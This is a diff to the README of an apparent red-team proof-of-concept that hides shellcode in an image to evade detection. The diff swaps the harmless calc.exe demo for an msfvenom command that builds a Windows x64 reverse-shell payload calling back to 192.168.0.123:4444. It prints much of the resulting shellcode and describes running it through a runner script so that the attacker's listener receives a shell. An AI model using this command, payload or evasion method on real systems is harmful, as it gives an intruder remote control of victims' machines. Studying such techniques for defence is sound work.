@@ -9,23 +9,31 @@ https://polygonben.github.io/defence%20evasion/Creating-Stego-payloads/
 
 ## Instructions for use
 ### Generating shellcode.
-For this POC I'll generate a simple calc.exe pop-up. Let's generate the corresponding shellcode in msfvenom:
 
-`msfvenom -a x86 --platform Windows -p windows/exec CMD=calc.exe -e x86/shikata_ga_nai -i 5 -f py`
+For this POC I'll generate a simple reverse-shell. Let's generate the corresponding shellcode in msfvenom:
+
+`msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.0.123 LPORT=4444 -f py`
 
 The shellcode generated will look something like this (this precise shellcode can be found in this repo as `shellcode.txt`):
 
 ```
-buf += b"\xbd\xa9\x52\xa3\x17\xd9\xce\xd9\x74\x24\xf4\x5a"
-buf += b"\x31\xc9\xb1\x4c\x31\x6a\x13\x83\xc2\x04\x03\x6a"
-buf += b"\xa6\xb0\x56\xad\x86\x76\x86\xf8\x2c\xab\x61\x88"
-....
-buf += b"\x86\x89\x46\x40\x19\x43\x18\xb6\x93\x1a\xd9\xc6"
-buf += b"\x6b\xbc\xfb\xd9\xc2\x64\x05\xee\x36\x3a\x50\x88"
-buf += b"\x26\x0d\x0c\xed\x7f\x35\x1b\xf5\xf3\xfe\xca\xec"
-buf += b"\xe0\x90\x46\xf3"
+buf =  b""
+buf += b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51"
+buf += b"\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52"
+buf += b"\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72"
+buf += b"\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0"
+buf += b"\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
+buf += b"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b"
+...
+buf += b"\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48\x31\xd2"
+buf += b"\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
+buf += b"\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d"
+buf += b"\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb"
+buf += b"\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41"
+buf += b"\x89\xda\xff\xd5"
 ```
-Copy the contents of the shellcode, like above, into a text file and save it!
+Copy the contents of the shellcode, like above, into a text file and save it! Please ensure the first line, 'buf = b""', is included.
+
 ### Picking an image
 
 For this part you can be creative, choose a fairly large image to ensure there is enough space to encode your shellcode. Save this to the same directory you put your shellcode text file in. 
@@ -48,4 +56,4 @@ https://polygonben.github.io/defence%20evasion/Creating-Stego-payloads/#poc-live
 
 ## Execution
 
-Execution should be simple, just edit the `encoded_image_path` variable in the `shellcode_runner.py` script to be the filename (or path), in my case `poc_example.png` and execute the script! You should see a calc.exe pop-up :)
+Execution should be simple, just edit the `encoded_image_path` variable in the `shellcode_runner.py` script to be the filename (or path), in my case `poc_example.png` and execute the script! If you've got a listener going on the attacking box, after executing the Python script you should get a call back! :)
